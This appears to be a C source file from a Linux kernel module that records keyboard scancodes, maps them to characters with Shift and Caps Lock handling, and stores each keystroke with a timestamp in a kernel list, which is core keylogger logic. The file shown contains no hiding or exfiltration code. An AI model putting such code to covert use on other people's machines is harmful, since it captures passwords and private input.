#include "kps_driver.h"

int is_undifined(unsigned char kc)
{
	if ((kc >= 0x54 && kc <= 0x57) || ((kc - 0x81) >= 0x54 && (kc - 0x81) <= 0x57)
		|| (kc >= 0x59 && kc <= 0x5A) || ((kc - 0x81) >= 0x59 && (kc - 0x81) <= 0x5A))
		return 0;
	return 1;
}

static bool	    is_alpha(int c)
{
	return (c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z');
}

static int	to_upper(int c)
{
	if (c > 96 && c < 123)
		return (c - 32);
	else
		return (c);
}

void handle_shift_pressed(struct key_entry *node)
{
	if (is_alpha(node->k_data.ascii_key ))
	{
		if (gmodifiers & Capslock)
			return;
		else
		{
			node->k_data.ascii_key = to_upper(node->k_data.ascii_key);
			return;
		}
	}
	else
	{
		char shifted_chars[] = "!@#$%^&*()_+{}|\":?><~";
		char original_chars[] = "1234567890-=[]\\';/.,`";
		for (int i = 0; original_chars[i] != '\0'; i++) {
			if (node->k_data.ascii_key == original_chars[i]) {
				node->k_data.ascii_key = (int)shifted_chars[i];
				return;
			}
		}
	}
}

int new_node(unsigned char kc)
{
	struct key_entry *new;
	struct rtc_time t = rtc_ktime_to_tm(ktime_get_real());

	if (!is_undifined(kc))
		return 0;
	
	new = kmalloc(sizeof(struct key_entry), GFP_KERNEL);
	if (!new)
		return -1;

	INIT_LIST_HEAD(&new->list);

	new->keycode = kc;
	if (kc >= 0x00 && kc <= 0x5D)
	{
		new->k_data = en_us[kc];
		new->state = Pressed;
	}
	else if (kc >= 0x81 && kc <= 0xdd)
	{
		new->k_data = en_us[kc - 0x80];
		new->state = Released;
	}

	if (new->k_data.ascii_key != 0x0)
	{
		if (gmodifiers & LShift || gmodifiers & RShift)
			handle_shift_pressed(new);
		else if (gmodifiers & Capslock)
		{
			if (is_alpha(new->k_data.ascii_key))
				new->k_data.ascii_key = to_upper(new->k_data.ascii_key);
		}
		if (new->state != Released)
			kps_data.aLen++;
	}
	
	
	new->hh = t.tm_hour;
	new->mm = t.tm_min;
	new->ss = t.tm_sec;

	mutex_lock(&kps_data.lock);
	list_add_tail(&new->list, &kps_data.entries);
	mutex_unlock(&kps_data.lock);
	return 0;
}
